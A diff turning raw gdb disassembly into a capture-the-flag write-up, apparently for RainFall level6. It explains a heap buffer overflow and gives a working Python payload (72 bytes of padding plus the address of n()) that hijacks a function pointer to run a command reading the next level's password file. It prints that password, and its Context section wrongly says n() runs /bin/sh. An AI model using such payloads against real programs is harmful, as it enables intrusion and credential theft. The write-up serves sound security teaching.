@@ -1,87 +1,135 @@
-```
-(gdb) info functions
-All defined functions:
+# Level6 - Heap Buffer Overflow (Function Pointer Overwrite)
 
-Non-debugging symbols:
-0x080482f4  _init
-0x08048340  strcpy
-0x08048340  strcpy@plt
-0x08048350  malloc
-0x08048350  malloc@plt
-0x08048360  puts
-0x08048360  puts@plt
-0x08048370  system
-0x08048370  system@plt
-0x08048380  __gmon_start__
-0x08048380  __gmon_start__@plt
-0x08048390  __libc_start_main
-0x08048390  __libc_start_main@plt
-0x080483a0  _start
-0x080483d0  __do_global_dtors_aux
-0x08048430  frame_dummy
-0x08048454  n
-0x08048468  m
-0x0804847c  main
-0x080484e0  __libc_csu_init
-0x08048550  __libc_csu_fini
-0x08048552  __i686.get_pc_thunk.bx
-0x08048560  __do_global_ctors_aux
-0x0804858c  _fini
-(gdb) disass main
-Dump of assembler code for function main:
-   0x0804847c <+0>:	push   %ebp
-   0x0804847d <+1>:	mov    %esp,%ebp
-   0x0804847f <+3>:	and    $0xfffffff0,%esp
-   0x08048482 <+6>:	sub    $0x20,%esp
-   0x08048485 <+9>:	movl   $0x40,(%esp)
-   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
-   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
-   0x08048495 <+25>:	movl   $0x4,(%esp)
-   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
-   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
-   0x080484a5 <+41>:	mov    $0x8048468,%edx
-   0x080484aa <+46>:	mov    0x18(%esp),%eax
-   0x080484ae <+50>:	mov    %edx,(%eax)
-   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
-   0x080484b3 <+55>:	add    $0x4,%eax
-   0x080484b6 <+58>:	mov    (%eax),%eax
-   0x080484b8 <+60>:	mov    %eax,%edx
-   0x080484ba <+62>:	mov    0x1c(%esp),%eax
-   0x080484be <+66>:	mov    %edx,0x4(%esp)
-   0x080484c2 <+70>:	mov    %eax,(%esp)
-   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
-   0x080484ca <+78>:	mov    0x18(%esp),%eax
-   0x080484ce <+82>:	mov    (%eax),%eax
-   0x080484d0 <+84>:	call   *%eax
-   0x080484d2 <+86>:	leave  
-   0x080484d3 <+87>:	ret    
-End of assembler dump.
-(gdb) disass m
-Dump of assembler code for function m:
-   0x08048468 <+0>:	push   %ebp
-   0x08048469 <+1>:	mov    %esp,%ebp
-   0x0804846b <+3>:	sub    $0x18,%esp
-   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
-   0x08048475 <+13>:	call   0x8048360 <puts@plt>
-   0x0804847a <+18>:	leave  
-   0x0804847b <+19>:	ret    
-End of assembler dump.
-(gdb) disass n
-Dump of assembler code for function n:
-   0x08048454 <+0>:	push   %ebp
-   0x08048455 <+1>:	mov    %esp,%ebp
-   0x08048457 <+3>:	sub    $0x18,%esp
-   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
-   0x08048461 <+13>:	call   0x8048370 <system@plt>
-   0x08048466 <+18>:	leave  
-   0x08048467 <+19>:	ret    
-End of assembler dump.
-(gdb) x/s 0x80485b0
-0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+## Context
+
+The program allocates two objects on the heap with `malloc` and uses `strcpy` without size check. By overflowing the first buffer, we can overwrite a **function pointer** stored in the second heap allocation to redirect execution to `n()` which calls `system("/bin/sh")`.
+
+---
+
+## What is a Heap Buffer Overflow
+
+### How malloc works
+
+```
+heap grows upward (toward higher addresses)
+each malloc() allocates the next available block
+
+malloc(0x40) → block1 at 0x804a008  (64 bytes)
+malloc(0x4)  → block2 at 0x804a050  (4 bytes)
+```
+
+Between two consecutive allocations, there is metadata :
+
+```
+0x804a008 : [ block1 - 64 bytes    ]  ← strcpy writes here
+0x804a048 : [ metadata - 8 bytes   ]  ← malloc header
+0x804a050 : [ block2 - 4 bytes     ]  ← function pointer stored here
+```
+
+### Why it is dangerous
+
+```c
+strcpy(block1, argv[1]);   // no size check !
+                           // overflows into block2
+                           // overwrites function pointer !
+```
+
+---
+
+## How the function pointer works
+
+```asm
+mov $0x8048468,%edx        ; edx = address of m()
+mov 0x18(%esp),%eax        ; eax = block2
+mov %edx,(%eax)            ; block2[0] = address of m()
+
+call strcpy(block1, argv1) ; overflow here !
+
+mov 0x18(%esp),%eax        ; eax = block2
+mov (%eax),%eax            ; eax = *(block2) = function pointer
+call *%eax                 ; calls whatever is in block2 !
+```
+
+The program stores `m()` address in block2 then calls it indirectly — if we overwrite block2 with `n()` address, we get a shell.
+
+---
+
+## The target functions
+
+```asm
+m() → puts("Nope")             ← default, called normally
+n() → system("/bin/cat /home/user/level7/.pass")  ← target !
 ```
 
 ```
-level6@RainFall:~$ python -c "print('A' * 72 + '\x54\x84\x04\x08')" > /tmp/exploit6
-level6@RainFall:~$ ./level6 `cat /tmp/exploit6`
+n() = 0x08048454   ← we want to call this
+```
+
+---
+
+## Step 1 : Calculate the offset
+
+```asm
+malloc(0x40)   ; block1 = 64 bytes
+malloc(0x4)    ; block2 = 4 bytes (function pointer)
+```
+
+```
+block1      = 0x804a008
+block2      = 0x804a050
+distance    = 0x804a050 - 0x804a008 = 0x48 = 72 bytes
+```
+
+We need **72 bytes** of padding to reach block2 and overwrite the function pointer.
+
+---
+
+## Step 2 : Final payload
+
+```bash
+python -c "print('A' * 72 + '\x54\x84\x04\x08')" > /tmp/exploit6
+./level6 $(cat /tmp/exploit6)
+```
+
+### Payload breakdown
+
+```
+'A' * 72          →  fills block1 (64 bytes) + heap metadata (8 bytes)
+\x54\x84\x04\x08  →  address of n() in little endian (0x08048454)
+                  →  overwrites function pointer in block2
+```
+
+---
+
+## Why 72 bytes
+
+```
+block1 size    = 64 bytes  (0x40)
+heap metadata  = 8 bytes   (malloc header between blocks)
+total offset   = 72 bytes  → reaches block2 function pointer
+```
+
+---
+
+## Full execution flow
+
+```
+1. malloc(64)  → block1 at 0x804a008
+2. malloc(4)   → block2 at 0x804a050
+3. block2[0]   = address of m() (0x08048468)
+4. strcpy()    → writes 72 'A' + address of n() into block1
+               → overflows 8 bytes past block1
+               → overwrites block2[0] with 0x08048454 (n())
+5. call *block2 → calls n() instead of m()
+6. n()         → system("/bin/cat /home/user/level7/.pass")
+7.             → password obtained !
+```
+
+---
+
+## Result
+
+```bash
+./level6 $(cat /tmp/exploit6)
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
